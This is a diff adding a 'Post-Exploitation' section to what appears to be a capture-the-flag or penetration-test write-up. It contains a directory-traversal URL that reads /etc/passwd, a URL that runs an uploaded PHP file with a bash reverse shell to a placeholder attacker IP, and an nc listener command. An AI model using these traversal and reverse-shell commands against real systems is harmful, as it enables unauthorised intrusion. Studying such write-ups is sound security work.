@@ -135,6 +135,32 @@ The file was written to disk and later executed through a directory traversal vu
 
 ## 7. Post-Exploitation
 
+### Directory Traversal
+
+The `notes` parameter in `manage.php` was vulnerable to directory traversal:
+
+```
+/department/manage.php?notes=files/ninevehNotes/../../../../../../../etc/passwd
+```
+
+This confirmed arbitrary file read access.
+
+### Remote Command Execution
+
+The previously created PHP file was executed via traversal to obtain a reverse shell:
+
+```
+/department/manage.php?notes=files/ninevehNotes/../../../../../../var/tmp/hack.php&cmd=/bin/bash -c 'bash -i >& /dev/tcp/<attacker-ip>/443 0>&1'
+```
+
+A listener was started on the attacker system:
+
+```
+nc -lnvp 443
+```
+
+This resulted in a shell as `www-data` (uid=33).
+
 ---
 
 ## 8. Privilege Escalation
